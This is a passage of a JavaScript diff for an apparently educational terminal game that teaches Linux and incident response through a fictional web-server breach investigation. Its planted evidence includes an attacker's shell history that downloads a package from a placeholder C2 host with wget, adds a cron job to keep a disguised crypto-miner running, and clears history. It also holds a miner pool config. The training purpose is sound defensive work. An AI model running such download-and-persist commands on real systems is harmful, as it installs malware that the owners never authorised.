+        '.secret_note': `You found your first hidden file!\nFiles whose names start with a dot are hidden from a plain ls.\nSettings files hide this way. Sometimes attackers do too.\n\nCode word: NIGHTOWL\n`,
+      },
+      projects: {
+        nullsec: { 'README.md': `# NullSec onboarding\nYour staff badge is in the badge/ folder.\n`, badge: { 'badge.txt': `NULLSEC STAFF BADGE\n-------------------\nName: ${h}\nRole: Junior Analyst\nBadge ID: NS-7731\n` } },
+        old_game: { 'main.py': `print("hello world")\n`, 'notes.txt': `I will finish this game one day.\n` },
+      },
+      tools: { 'oui.txt': `# MAC address prefix -> manufacturer (excerpt of the public IEEE list)\n00-1B-A9   Brother Industries, Ltd. (printers)\n3C-22-FB   Apple, Inc.\n9C-53-22   TP-LINK TECHNOLOGIES CO.,LTD.\nB8-27-EB   Raspberry Pi Foundation\nDC-A6-32   Raspberry Pi Trading Ltd\nF4-F5-D8   Google, Inc.\n00-50-56   VMware, Inc.\nAC-DE-48   Private\n` },
+      office: { 'inventory.txt': `NULLSEC OFFICE - KNOWN DEVICES (wifi: nullsec-office)\nIP              DEVICE\n192.168.1.1     router\n192.168.1.20    Ghost's MacBook\n192.168.1.31    printer (please stop printing memes)\n192.168.1.42    new analyst laptop\n` },
+      cases: { lumen: {
+        'README.txt': `CASE: Lumen Robotics\n\nLumen's web server (lumen-web) has been slow for two days and their\nadmins found logins they don't recognise. They copied the server's\nlogs and some files for us. Our job: find out what happened, then clean\nit up and make sure it can't happen again.\n\nlogs/          - copies of the server logs\nwebroot_copy/  - copy of the website folder\nevidence/      - suspicious things the admins found\n`,
+        logs: { 'access.log': genAccessLog(), 'auth.log': genAuthLog() },
+        webroot_copy: {
+          'index.html': '<h1>Lumen Robotics</h1>\n', css: { 'style.css': 'body{font-family:sans-serif}\n' }, img: { 'logo.svg': '<svg/>\n' },
+          blog: { 2023: { 'hello.html': '<p>hello robots</p>\n' }, drafts: { 'new-rover.txt': 'Rover launch: summer\n' } },
+          'site_backup.bak': `LUMEN ROBOTICS - SITE BACKUP (made 2021, "temporary")\n\n[config]\ndeploy_user = svc_deploy\ndeploy_login = (password stored here in plain text -- redacted by NULLSEC)\nnote = we should delete this file later\n`,
+          old: { 'about_v1.html': '<p>old about page</p>\n', 'notes.txt': filler(3) },
+        },
+        evidence: {
+          'payload.b64': toB64(`Download update from ${C2} and run it quietly every 5 minutes`) + '\n',
+          'note.txt': rot13('Meeting for the BLACKFERN crew is on Friday. Do not use real names.') + '\n',
+          'drop.hex': toHex('drop folder = /tmp/.cache') + '\n',
+          bin: { nginx: BIN_NOW.nginx, sshd: BIN_NOW.sshd, ls: BIN_NOW.ls },
+          'known_good.sha256': known,
+          'README.txt': `known_good.sha256 lists the official fingerprints (SHA-256 hashes)\nof the programs in bin/. If a program's hash doesn't match, it was changed.\n`,
+        },
+      } },
+    } },
+    etc: {
+      hosts: `127.0.0.1    localhost\n127.0.1.1    nullbox\n192.168.1.1  router\n10.20.0.5    lumen-web\n`,
+      passwd: `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n${u}:x:1000:1000:${h}:/home/${u}:/bin/bash\n`,
+      'os-release': `NAME="NullBox Linux"\nVERSION="1.0 (Night Owl)"\nID=nullbox\n`,
+      shadow: { $deny: true },
+    },
+    root: { $deny: true },
+    tmp: { $own: 'root' },
+    var: { log: { syslog: `Mar 14 08:00:01 nullbox kernel: NullBox booted\nMar 14 08:00:03 nullbox NetworkManager: connected to "nullsec-office" (192.168.1.42)\n` } },
+  }, 'root');
+  fs.c.home.c[u] = retag(fs.c.home.c[u], u);
+  fs.c.tmp.own = 'root'; fs.c.tmp.mode = '777';
+  return fs;
+}
+function retag(node, own) { node.own = own; if (node.t === 'd') for (const k in node.c) retag(node.c[k], own); return node; }
+function buildLumen() {
+  const st = S.lw || {};
+  const fs = mk({
+    home: {
+      analyst: { 'README.txt': `Lumen Robotics - incident response access for NULLSEC analysts.\nYou have sudo rights on this server for the duration of the case.\nPlease be careful. -- Lumen IT\n` },
+      svc_deploy: { $own: 'svc_deploy', $deny: true,
+        '.bash_history': `whoami\nid\nuname -a\ncd /tmp\nmkdir .cache\ncd .cache\nwget http://${C2}/k.tar.gz\ntar xzf k.tar.gz\nchmod +x kworkerd\nsudo sh -c 'echo "*/5 * * * * svc_deploy /tmp/.cache/kworkerd --quiet" > /etc/cron.d/sys-update'\n./kworkerd --quiet &\nrm k.tar.gz\nhistory -c\n` },
+    },
+    etc: {
+      hostname: 'lumen-web\n',
+      passwd: `root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nanalyst:x:1001:1001:NULLSEC analyst:/home/analyst:/bin/bash\nsvc_deploy:x:1002:1002:deploy account:/home/svc_deploy:/bin/bash\n`,
+      'cron.d': { logrotate: `# rotate logs every night\n0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf\n`, 'sys-update': `*/5 * * * * svc_deploy /tmp/.cache/kworkerd --quiet\n` },
+      shadow: { $deny: true },
+    },
+    tmp: { '.cache': { $own: 'svc_deploy', kworkerd: '\u007fELF [binary: crypto-miner, packed]\n', 'config.json': `{\n  "pool": "${C2}:3333",\n  "worker": "lumen-web",\n  "crew": "BLACKFERN"\n}\n` } },
+    var: { www: { $own: 'www-data', '.env': `APP_ENV=production\nDB_HOST=localhost\nDB_PASSWORD=(secret)\n`, html: { 'index.html': '<h1>Lumen Robotics</h1>\n', 'site_backup.bak': `LUMEN ROBOTICS - SITE BACKUP (made 2021, "temporary")\ndeploy_user = svc_deploy\n` } }, log: { 'auth.log': genAuthLog() } },
+    root: { $deny: true },
+  }, 'root');
+  fs.c.home.c.analyst = retag(fs.c.home.c.analyst, 'analyst');
+  fs.c.tmp.mode = '777';
+  fs.c.etc.c.shadow.mode = '640';
+  fs.c.var.c.www.c['.env'].mode = st.env ? '600' : '644';
+  if (st.cron) delete fs.c.etc.c['cron.d'].c['sys-update'];
+  if (st.cache) delete fs.c.tmp.c['.cache'];
+  if (st.backup) delete fs.c.var.c.www.c.html.c['site_backup.bak'];
+  return fs;
+}
+
+/* ============ learn cards ============ */
+const CARDS = {
+  ls: { cmd: 'ls', title: 'List files', what: 'Shows the files and folders in a directory. "Directory" is the Linux word for folder.', real: 'One of the most-typed commands in the world. It works on every Linux server, every Mac and most cloud machines.<br><b>Try:</b> <code>ls -l</code> shows sizes, owners and permissions. <code>ls -la</code> also shows hidden files.', ex: 'ls\nls -l\nls /etc' },
+  cat: { cmd: 'cat', title: 'Print a file', what: 'Prints a file\'s contents to the screen. The name is short for "concatenate" (joining files together).', real: 'People use it all day to read config files, logs and notes. One of the first things an investigator reads on a server is <code>cat /etc/passwd</code>, the list of user accounts.', ex: 'cat welcome.txt\ncat /etc/hosts' },
+  pwd: { cmd: 'pwd', title: 'Print working directory', what: 'Tells you which folder you are in right now.', real: 'A terminal has no window showing your location, so <code>pwd</code> is your "you are here" sign. Linux paths start at <code>/</code>, called the root.', ex: 'pwd' },
+  cd: { cmd: 'cd', title: 'Change directory', what: 'Moves you into another folder.', real: '<code>cd folder</code> goes in · <code>cd ..</code> goes up one level · <code>cd</code> or <code>cd ~</code> goes home · <code>cd /</code> goes to the very top · <code>cd -</code> goes back to where you just were.', ex: 'cd Documents\ncd ..\ncd ~' },
+  hidden: { cmd: 'ls -a', title: 'Hidden files', what: 'A file whose name starts with a dot (.) is hidden. <code>ls -a</code> shows <b>a</b>ll files, hidden ones included.', real: 'Settings live in hidden files (<code>.bashrc</code>, <code>.ssh/</code>, <code>.git/</code>). <b>Security:</b> attackers like to hide their files in dot-folders such as <code>/tmp/.cache</code>, so defenders always use <code>ls -la</code>.', ex: 'ls -a\nls -la ~' },
+  paths: { cmd: '..  ~  /', title: 'Paths', what: 'An <b>absolute</b> path starts with / and works from anywhere. A <b>relative</b> path starts from the folder you are in.', real: '<code>/home/{u}/projects</code> is absolute. <code>projects</code> is relative. <code>..</code> means the folder above, <code>.</code> means this folder, and <code>~</code> means your home folder.', ex: 'cd /home/{u}/projects\ncd ../Documents\ncat ~/welcome.txt' },
+  grep: { cmd: 'grep', title: 'Search text', what: 'Prints only the lines that contain a word or pattern.', real: 'This is the most useful tool for security analysts and admins, who search huge logs with it every day.<br><code>-i</code> ignores upper/lower case · <code>-n</code> shows line numbers · <code>-v</code> shows lines that <b>don\'t</b> match · <code>-r</code> searches every file in a folder · <code>-c</code> counts matches.', ex: 'grep backup access.log\ngrep -i error /var/log/syslog\ngrep -rn "TODO" ~/projects' },
+  find: { cmd: 'find', title: 'Find files', what: 'Searches through folders for files by name, type and more.', real: 'Admins use it to find forgotten backups, large files and config files. Leftover <code>.bak</code> and <code>.old</code> files on web servers cause real data leaks, so defenders hunt for them with <code>find</code>.', ex: 'find ~ -name "*.txt"\nfind . -type d\nfind /etc -name "*.conf"' },
+  wc: { cmd: 'wc', title: 'Count lines', what: 'Counts lines, words and characters. <code>wc -l</code> counts only lines.', real: 'Answers "how many?" questions: how many users, how many errors, how many login attempts.', ex: 'wc -l auth.log\nwc welcome.txt' },
+  pipe: { cmd: '|', title: 'The pipe', what: 'Sends the output of one command into the next one, so you can chain small tools into a powerful one-liner.', real: 'This is the core idea of Unix. Analysts chain commands to answer questions about logs, like this one, which lists the IP addresses with the most failed logins:<br><code>grep Failed auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -nr</code>', ex: 'grep Failed auth.log | wc -l\ncat access.log | grep POST | head -5' },
+  base64: { cmd: 'base64', title: 'Base64 encoding', what: 'Turns any data into plain letters and numbers, and back again with <code>-d</code>.', real: '<b>Encoding is NOT encryption.</b> There is no key: anyone can decode it. You\'ll see Base64 in emails, web tokens and data URLs. Malware often hides its commands in Base64, so analysts decode it all the time. A clue that text is Base64: only A–Z a–z 0–9 + /, often ending with <code>=</code>.', ex: 'echo -n hello | base64\nbase64 -d payload.b64' },
+  tr: { cmd: 'tr', title: 'Swap characters (ROT13)', what: 'Replaces characters with other characters. Shifting every letter 13 places is called ROT13, a kind of Caesar cipher.', real: 'Julius Caesar shifted letters 2,000 years ago. It\'s easy to break, but you still see it in puzzles, CTFs and lazy "hiding". <code>tr</code> is also handy for cleanup, for example <code>tr a-z A-Z</code> makes text uppercase.', ex: "tr 'A-Za-z' 'N-ZA-Mn-za-m' < note.txt\necho hello | tr a-z A-Z" },
+  xxd: { cmd: 'xxd', title: 'Hex', what: 'Hex writes each byte as two characters (0–9, a–f). <code>xxd -r -p</code> turns hex back into text.', real: 'Hex is how computers show raw data: network captures (Wireshark), memory, file headers and colours like #ff0000. <code>xxd file</code> shows any file as hex.', ex: 'echo -n hi | xxd -p\nxxd -r -p drop.hex' },
+  hash: { cmd: 'sha256sum', title: 'Hashes = fingerprints', what: 'A hash is a fixed-length fingerprint of data. Change one letter and the whole hash changes. You can\'t turn a hash back into the data.', real: 'Software websites publish SHA-256 hashes so you can check a download wasn\'t changed. Security tools compare program hashes against known-good lists to catch tampered files. Websites should store password <b>hashes</b>, never the passwords themselves.<br><code>sha256sum -c list.sha256</code> checks many files at once.', ex: 'echo -n hello | sha256sum\nsha256sum bin/*\nsha256sum -c known_good.sha256' },
+  ip: { cmd: 'ip a', title: 'Your IP address', what: 'Shows your network interfaces and their IP addresses. <code>ifconfig</code> is the older version.', real: 'An IP address is like a street address for a device. <code>192.168.x.x</code> and <code>10.x.x.x</code> are <b>private</b> addresses used inside homes and offices. <code>/24</code> means the first 3 numbers are the network, so the network can have up to 254 devices.', ex: 'ip a\nip route' },
+  ping: { cmd: 'ping', title: 'Is it alive?', what: 'Sends small "are you there?" packets to a device and measures how long the reply takes.', real: 'This is the first step in fixing almost any network problem. On Linux, <code>ping</code> keeps going until you press <b>Ctrl+C</b>. Use <code>-c 4</code> to send only 4. The <code>time=</code> value is how long the round trip took, in milliseconds.', ex: 'ping -c 4 192.168.1.1' },
+  neigh: { cmd: 'ip neigh', title: 'Devices near you', what: 'Lists the devices on your local network that your computer has recently talked to, with their MAC addresses.', real: 'A MAC address is a hardware ID. Its first 3 bytes identify the manufacturer, called the <b>OUI</b>. Defenders compare network devices against an inventory list to spot <b>rogue devices</b>, such as a hidden Raspberry Pi plugged into an office network.', ex: 'ip neigh\ngrep -i b8-27-eb oui.txt' },
+  ssh: { cmd: 'ssh', title: 'Secure shell', what: 'Opens a terminal on another computer over an encrypted connection.', real: 'This is how almost every server in the world is managed. Logging in with <b>keys</b> is much safer than with passwords. <code>exit</code> brings you back to your own computer. Always check the hostname in your prompt so you know <b>which machine</b> you\'re typing on!', ex: 'ssh analyst@lumen-web\nexit' },
+  sudo: { cmd: 'sudo', title: 'Run as admin', what: 'Runs one command with administrator (root) rights.', real: 'Root can do anything, including deleting the whole system, which is why normal users don\'t work as root. <code>sudo</code> asks for admin rights one command at a time and <b>logs every use</b>. Only give sudo to people who need it.', ex: 'sudo cat /etc/shadow\nsudo -l' },
+  last: { cmd: 'last', title: 'Login history', what: 'Shows who logged in, from which IP address, and when.', real: 'One of the first commands in any investigation. It answers "who was on this machine?" Attackers try to delete these records, which is why companies also send their logs to a separate server.', ex: 'last\nlast svc_deploy' },
+  history: { cmd: '.bash_history', title: 'Command history', what: 'Bash saves the commands each user types in a hidden file called <code>~/.bash_history</code>.', real: 'For investigators this file is gold: it can show exactly what an attacker typed. Careful attackers delete or turn off history. This one ran <code>history -c</code>, which only clears the current session\'s memory. The file was already written.', ex: 'cat ~/.bash_history\nhistory' },
+  cron: { cmd: 'cron', title: 'Scheduled tasks', what: 'Cron runs commands automatically on a schedule. The 5 fields are: minute, hour, day of month, month, day of week.', real: '<code>*/5 * * * *</code> means "every 5 minutes". <code>0 3 * * *</code> means "3:00 every night". Admins use cron for backups. Attackers use it for <b>persistence</b>, so their program restarts even after you kill it. Always check <code>/etc/cron.d/</code> and <code>crontab -l</code>.', ex: 'ls /etc/cron.d\ncrontab -l' },
+  ps: { cmd: 'ps aux', title: 'Running programs', what: 'Lists every running process with its owner, PID (process ID), CPU and memory use.', real: 'Real kernel threads appear in [brackets] and belong to root. A program named <code>kworkerd</code> owned by a normal user and using 98% CPU is pretending to be one of them. Crypto-miners hide like this all the time. <code>top</code> shows the same information live.', ex: 'ps aux\nps aux | grep kworker' },
+  ss: { cmd: 'ss -tnp', title: 'Network connections', what: 'Shows open network connections and which program owns each one. <code>-t</code> TCP · <code>-n</code> numbers · <code>-p</code> process · <code>-l</code> listening.', real: 'Answers "what is this machine talking to?" An unknown program with a connection to an outside IP on an odd port (3333 is common for mining pools) is a big red flag. <code>netstat</code> is the older version of this tool.', ex: 'ss -tnp\nss -tlnp' },
+  kill: { cmd: 'kill', title: 'Stop a process', what: 'Sends a signal to a process. By default it asks the process to stop. <code>kill -9</code> forces it to stop.', real: 'Containment step 1: stop the bad program. Don\'t stop there, though. If you skip the cron job or leave the files in place, it comes straight back.', ex: 'kill 4127\nkill -9 4127' },
+  rm: { cmd: 'rm', title: 'Remove files', what: 'Deletes files. <code>rm -r</code> deletes folders and everything in them.', real: 'There is <b>no recycle bin</b> in the terminal. Professionals copy evidence first and only then delete. <code>sudo rm -rf /</code> is the most famous mistake in Linux history. Always double-check your path!', ex: 'rm file.txt\nrm -r folder' },
+  ufw: { cmd: 'ufw', title: 'Firewall', what: 'UFW ("uncomplicated firewall") lets you allow or block network traffic.', real: 'Blocking the attacker\'s IP is a quick fix. Attackers can switch IPs, so it\'s only one layer. Real defence uses many layers: firewall, strong logins, updates and monitoring.', ex: 'sudo ufw deny from 198.51.100.23\nsudo ufw status' },
+  passwd: { cmd: 'passwd -l', title: 'Lock an account', what: '<code>passwd -l user</code> locks an account\'s password so nobody can log in with it.', real: 'When an account is stolen you lock it straight away, then reset its password and keys. Service accounts like <code>svc_deploy</code> shouldn\'t use passwords at all. Use SSH keys instead.', ex: 'sudo passwd -l svc_deploy' },
+  chmod: { cmd: 'chmod', title: 'Permissions', what: 'Changes who can read, write or run a file. The three digits are for owner · group · everyone else.', real: '4 = read, 2 = write, 1 = execute; add them up. <code>644</code> = owner can read and write, everyone else can read. <code>600</code> = only the owner can read or write. Secret files like <code>.env</code> (database passwords!) should be <b>600</b>. World-readable secrets are one of the most common mistakes on real servers.', ex: 'chmod 600 .env\nls -l .env' },
+};
+
+/* ============ mission helpers ============ */
+const normA = s => String(s).trim().replace(/^["']|["']$/g, '').toLowerCase();
+const LINE = fn => ev => ev.type === 'line' && fn(ev);
+const homeOf = host => host === 'lumen-web' ? '/home/analyst' : '/home/' + S.user;
+const P = (p, host = 'nullbox') => p.replace(/^~/, homeOf(host));
+const used = (name, host = 'nullbox', test) => LINE(e => e.cmds.some(c => c.host === host && c.name === name && (!test || test(c.args.join(' '), c))));
+const read = (path, host = 'nullbox') => LINE(e => e.reads.some(r => r.host === host && r.abs === P(path, host)));
+const cwdIs = (path, host = 'nullbox') => LINE(e => e.host === host && e.cwd === P(path, host));
+const ans = (...vals) => Object.assign(ev => ev.type === 'submit' && vals.some(v => normA(v) === normA(ev.value)), { sub: true });
+const state = fn => ev => (ev.type === 'line' || ev.type === 'state') && fn();
+const LW = () => S.lw || (S.lw = {});
+
+/* ============ missions ============ */
+const MISSIONS = [
+  // ---------- CHAPTER 1 ----------
+  { ch: 'FIRST BOOT', title: 'Wake Up', xp: 60,
+    mail: { from: 'NULLSEC HR', subj: 'Welcome aboard!', body: "Hi {h},\n\nWelcome to NULLSEC! Your laptop is ready. Your mentor, **Ghost**, will train you in the chat window.\n\nThe golden rule here: we only ever touch systems we have **permission** to touch. Everything we do is about protecting people.\n\nHave fun,\nNULLSEC HR" },
+    intro: ["Hey {h} 👋 I'm **Ghost**, your mentor. Real name classified. Mostly because it's embarrassing.", "We're incident responders: when a company gets hacked, they call us. But first you need to speak **terminal**.", "Click the **Terminal** window. That's where everything happens."],
+    objs: [
+      { t: 'List the files in your home folder', say: "Type `ls` and press **Enter**. It **l**i**s**ts the files in the folder you're in.", hints: ['The command is two letters: l and s.', 'Type: `ls`'], check: used('ls'), learn: 'ls', done: "Nice! **Blue** names are folders, white names are files." },
+      { t: 'Read welcome.txt', say: "Now read `welcome.txt`. Type `cat` followed by a space and the file name.", hints: ['cat shows what\'s inside a file.', 'Type: `cat welcome.txt`  (tip: type `cat wel` and press Tab)'], check: read('~/welcome.txt'), learn: 'cat', done: "Pro tip: press **Tab** to auto-complete file names. Hackers are lazy typists." },
+      { t: 'Find out where you are', say: "Where are you on this computer? `pwd` = **p**rint **w**orking **d**irectory.", hints: ['Three letters: p w d', 'Type: `pwd`'], check: used('pwd'), learn: 'pwd', done: "That's your **home folder**. Every Linux user has one under `/home`." },
+    ], outro: "Mission complete! `ls`, `cat` and `pwd`: you'll type those thousands of times in your career." },
+  { ch: 'FIRST BOOT', title: 'Hidden Things', xp: 70,
+    intro: ["Next lesson: not everything is visible. Some files are **hidden**."],
+    objs: [
+      { t: 'Move into the Documents folder', say: "Use `cd` (**c**hange **d**irectory) to go into `Documents`.", hints: ['cd + space + folder name', 'Type: `cd Documents`'], check: cwdIs('~/Documents'), learn: 'cd', done: "See how your prompt changed to `~/Documents`? That's where you are now." },
+      { t: 'List ALL files, including hidden ones', say: "Run `ls`. Looks normal? Now try `ls -a` to show **a**ll files.", hints: ['Add the -a option to ls', 'Type: `ls -a`'], check: used('ls', 'nullbox', (a) => /(^|\s)-\w*a/.test(a)), learn: 'hidden', done: "Gotcha! `.secret_note` was hiding. (`.` is this folder, `..` is the folder above.)" },
+      { t: 'Read the hidden note and submit the code word', say: "Read it with `cat .secret_note`, then send me the code word with `submit WORD`.", hints: ['Read the note: `cat .secret_note`', 'The code word is in the last line. Type: `submit NIGHTOWL`'], check: ans('NIGHTOWL') },
+    ], outro: "You've got a good eye. Attackers hide things in dot-files too, so you'll use this a lot." },
+  { ch: 'FIRST BOOT', title: 'Navigator', xp: 80,
+    intro: ["HR says you need your **staff badge ID**. It's somewhere in `~/projects/nullsec`.", "Tip: `cd ~` jumps home from anywhere. The `~` key is usually to the left of 1, or Shift+` on a Mac."],
+    objs: [
+      { t: 'Go into ~/projects/nullsec/badge', say: "You can go folder by folder, or jump there in one go: `cd ~/projects/nullsec/badge`.", hints: ['Use cd with the full path, or use ls and cd one step at a time.', 'Type: `cd ~/projects/nullsec/badge`'], check: cwdIs('~/projects/nullsec/badge') },
+      { t: 'Read the badge and submit your Badge ID', hints: ['ls, then cat the file you see.', '`cat badge.txt`, then `submit NS-7731`'], check: ans('NS-7731') },
+      { t: 'Go UP one folder with cd ..', say: "Now go **up** one folder: `cd ..` (two dots = the folder above).", hints: ['Two dots mean "parent folder".', 'Type: `cd ..`'], check: cwdIs('~/projects/nullsec'), learn: 'paths' },
+      { t: 'Jump straight home', say: "Last one: get home from anywhere with `cd ~` (or just `cd`).", hints: ['~ means home.', 'Type: `cd ~`'], check: cwdIs('~') },
+    ], outro: "Chapter 1 done! You can move around any Linux machine now. 🧭" },
+
+  // ---------- CHAPTER 2 ----------
+  { ch: 'DIGGING', title: 'Needle in a Haystack', xp: 100,
+    mail: { from: 'Lumen Robotics IT', subj: 'URGENT: we think we got hacked', body: "Hello NULLSEC,\n\nOur web server **lumen-web** has been really slow for two days, and our admins saw logins we don't recognise.\n\nWe copied the logs and some files into your case folder: `~/cases/lumen`\n\nPlease help us find out what happened.\n\nMaya Chen\nIT Manager, Lumen Robotics" },
+    intro: ["We've got our first real case! 🚨 Read the mail from **Lumen Robotics** when you get a sec.", "Every investigation starts with the **logs**. Logs are diaries that computers keep."],
+    objs: [
+      { t: 'Go to ~/cases/lumen/logs and list the files', say: "Go to `~/cases/lumen/logs` and `ls`.", hints: ['cd then ls', '`cd ~/cases/lumen/logs` then `ls`'], check: LINE(e => e.host === 'nullbox' && e.cwd === P('~/cases/lumen/logs') && e.cmds.some(c => c.name === 'ls')) },
+      { t: 'Try reading access.log with cat', say: "`access.log` lists every visit to Lumen's website. Go ahead, `cat` it.", hints: ['', '`cat access.log`'], check: read('~/cases/lumen/logs/access.log'), done: "Yeah... **1,500 lines**. Nobody reads that by hand. We **search** it." },
+      { t: 'Search the log for the word backup', say: "Admins leave backups lying around and attackers look for them. Search with `grep backup access.log`.", hints: ['grep WORD FILE', '`grep backup access.log`'], check: used('grep', 'nullbox', a => /backup/i.test(a)), learn: 'grep', done: "Look at that: someone scanned for backup files, got two **404**s (not found), then a **200** (success!) on `/site_backup.bak`." },
+      { t: 'Submit the IP address that downloaded site_backup.bak', hints: ['The IP is the first thing on the line with "200".', `submit ${ATTACKER}`], check: ans(ATTACKER), done: "That's our **suspect**. Write it down: `198.51.100.23`." },
+    ], outro: "First clue found! The attacker downloaded a backup file that should never have been public." },
+  { ch: 'DIGGING', title: 'The Forgotten Backup', xp: 100,
+    intro: ["Lumen sent us a copy of their website folder. Let's find that backup and see what leaked. It's in `~/cases/lumen/webroot_copy` somewhere."],
+    objs: [
+      { t: 'Use find to locate every .bak file in webroot_copy', say: "Don't click through folders. Use `find`:\n`find ~/cases/lumen/webroot_copy -name \"*.bak\"`\nThe `*` means \"anything\".", hints: ['find FOLDER -name "PATTERN"', '`find ~/cases/lumen/webroot_copy -name "*.bak"`'], check: used('find', 'nullbox', a => /\.bak/.test(a)), learn: 'find' },
+      { t: 'Read the backup. Which account was exposed? Submit it', hints: ['cat the path that find printed.', '`cat ~/cases/lumen/webroot_copy/site_backup.bak`, then `submit svc_deploy`'], check: ans('svc_deploy'), done: "Ouch. The login for **svc_deploy** was sitting in a public file. That's how the attacker got in." },
+    ], outro: "Lesson for Lumen: never leave backups in a public web folder. This exact mistake causes real breaches every year." },
+  { ch: 'DIGGING', title: 'Pipe Dream', xp: 120,
+    intro: ["`auth.log` records every login attempt on lumen-web. Let's measure the attack.", "New superpower: the **pipe** `|`. It sends one command's output into the next command."],
+    objs: [
+      { t: 'Count the lines in auth.log with wc -l', say: "`wc -l auth.log` counts lines (you should still be in the logs folder).", hints: ['wc = word count, -l = lines', '`wc -l ~/cases/lumen/logs/auth.log`'], check: used('wc', 'nullbox', (a, c) => true), learn: 'wc' },
+      { t: 'How many FAILED logins are there? (grep + | + wc)', say: "Chain them: `grep Failed auth.log | wc -l`\ngrep finds the lines, then wc counts them. Then `submit` the number.", hints: ['grep Failed auth.log | wc -l', 'Run the command and submit the number it prints.'], check: Object.assign(ev => ev.type === 'submit' && normA(ev.value) === String(FAIL_TOTAL), { sub: true }), learn: 'pipe' },
+      { t: `How many of those came from ${ATTACKER}?`, say: "Pipes can be chained as many times as you like:\n`grep Failed auth.log | grep " + ATTACKER + " | wc -l`", hints: ['Add another grep in the middle.', `grep Failed auth.log | grep ${ATTACKER} | wc -l`], check: Object.assign(ev => ev.type === 'submit' && normA(ev.value) === String(FAIL_ATTACKER), { sub: true }), done: "A **brute-force** attack: guess after guess after guess." },
+      { t: 'Did they get in? Find the "Accepted" login from the attacker IP', say: "Now search for successful logins from that IP: `grep Accepted auth.log | grep " + ATTACKER + "`.\nSubmit the account name they logged in as.", hints: ['grep Accepted, pipe into grep IP', '`submit svc_deploy`'], check: ans('svc_deploy'), done: "Confirmed: they logged in as **svc_deploy** using the password from that backup. 😬" },
+    ], outro: "Chapter 2 done! You just did real log analysis, the main job of a SOC (Security Operations Centre) analyst." },
+
+  // ---------- CHAPTER 3 ----------
+  { ch: 'SECRET CODES', title: 'Not Encryption', xp: 100,
+    intro: ["Lumen's admins found some weird files. They're in `~/cases/lumen/evidence`. Let's decode them."],
+    objs: [
+      { t: 'Read evidence/payload.b64', say: "Go to `~/cases/lumen/evidence` and `cat payload.b64`.", hints: ['', '`cat ~/cases/lumen/evidence/payload.b64`'], check: read('~/cases/lumen/evidence/payload.b64'), done: "Gibberish? Letters, numbers, maybe `=` at the end... that's **Base64**." },
+      { t: 'Decode it with base64 -d and submit the IP address inside', say: "Decode it: `base64 -d payload.b64`", hints: ['base64 -d FILE', `Decode it, then: submit ${C2}`], check: ans(C2), learn: 'base64', done: "So the attacker downloaded a program from **" + C2 + "** and set it to run every 5 minutes. Remember that." },
+    ], outro: "Base64 hides nothing from anyone who knows to decode it. Remember: **encoding ≠ encryption**." },
+  { ch: 'SECRET CODES', title: 'Caesar & Hex', xp: 120,
+    intro: ["Two more files: `note.txt` and `drop.hex`. Same folder."],
+    objs: [
+      { t: 'Decode note.txt with ROT13 and submit the crew name', say: "This one's ROT13 (every letter shifted 13 places). Linux can undo it with `tr`:\n`tr 'A-Za-z' 'N-ZA-Mn-za-m' < note.txt`\nThe `<` feeds the file into the command.", hints: ["Copy the command exactly, quotes included.", 'The crew name is in capitals. `submit BLACKFERN`'], check: ans('BLACKFERN'), learn: 'tr', done: "**BLACKFERN**. A crew known for planting crypto-miners on servers they break into. That explains why the server is slow!" },
+      { t: 'Decode drop.hex with xxd and submit the folder path', say: "That's **hex**. Turn it back into text with `xxd -r -p drop.hex`.", hints: ['-r = reverse, -p = plain hex', '`submit /tmp/.cache`'], check: ans('/tmp/.cache', '/tmp/.cache/'), learn: 'xxd', done: "A hidden folder inside `/tmp`. Classic hiding spot. We'll check it on the real server later." },
+    ] },
+  { ch: 'SECRET CODES', title: 'Fingerprints', xp: 130,
+    intro: ["Lumen copied 3 programs from the server into `evidence/bin/`. They're worried one was **modified**. We can check that with **hashes**."],
+    objs: [
+      { t: 'Make your first hash: echo -n hello | sha256sum', say: "Try: `echo -n hello | sha256sum`\nThen try `echo -n Hello | sha256sum`, with a capital H. Compare the two!", hints: ['-n stops echo adding a newline, which would change the hash.', '`echo -n hello | sha256sum`'], check: used('sha256sum'), learn: 'hash', done: "One letter changed and the whole fingerprint changed. That's why hashes catch tampering." },
+      { t: 'Hash all three programs in evidence/bin', say: "From the evidence folder: `sha256sum bin/*`", hints: ['The * matches every file in bin/', '`cd ~/cases/lumen/evidence` then `sha256sum bin/*`'], check: used('sha256sum', 'nullbox', a => /bin/.test(a)) },
+      { t: 'Compare with known_good.sha256. Submit the tampered program', say: "`cat known_good.sha256` shows the official hashes. Which one doesn't match?\nPro move: `sha256sum -c known_good.sha256` checks them all for you.", hints: ['Look for the line that says FAILED, or compare the hashes by eye.', '`submit nginx`'], check: ans('nginx', 'bin/nginx'), done: "**nginx** (the web server program) was modified! We'll tell Lumen to reinstall it from the official source." },
+    ], outro: "Chapter 3 done! You can decode data and detect changed files, two everyday skills in malware analysis." },
+
+  // ---------- CHAPTER 4 ----------
+  { ch: 'THE NETWORK', title: 'Where Am I?', xp: 100,
+    intro: ["Quick networking lesson before we go to Lumen's server. First: **your** laptop on **our** office Wi-Fi."],
+    objs: [
+      { t: 'Show your network info with ip a', say: "Type `ip a`. Look for `inet` under **wlan0**: that's your IP address.", hints: ['ip a (or ifconfig)', 'Look at the inet line under wlan0'], check: LINE(e => e.host === 'nullbox' && e.cmds.some(c => c.name === 'ip' || c.name === 'ifconfig')), learn: 'ip' },
+      { t: 'Submit your IP address (without the /24)', hints: ['It starts with 192.168.1.', '`submit 192.168.1.42`'], check: ans('192.168.1.42') },
+      { t: 'Ping the office router 192.168.1.1', say: "Is the router alive? `ping 192.168.1.1`\n(It keeps going forever: stop it with **Ctrl+C**, or use `ping -c 4 192.168.1.1`.)", hints: ['ping IP', '`ping -c 4 192.168.1.1`'], check: used('ping', 'nullbox', a => a.includes('192.168.1.1')), learn: 'ping' },
+    ] },
+  { ch: 'THE NETWORK', title: 'Rogue Device', xp: 130,
+    mail: { from: 'Ghost', subj: 'weird thing on our wifi', body: "Hey, side quest 👀\n\nOur router says there are more devices on the office Wi-Fi than we have in the inventory (`~/office/inventory.txt`).\n\nFind the device that shouldn't be there.\n\n- G" },
+    intro: ["Side quest! Check your mail. There's a device on our office Wi-Fi that isn't on our list."],
+    objs: [
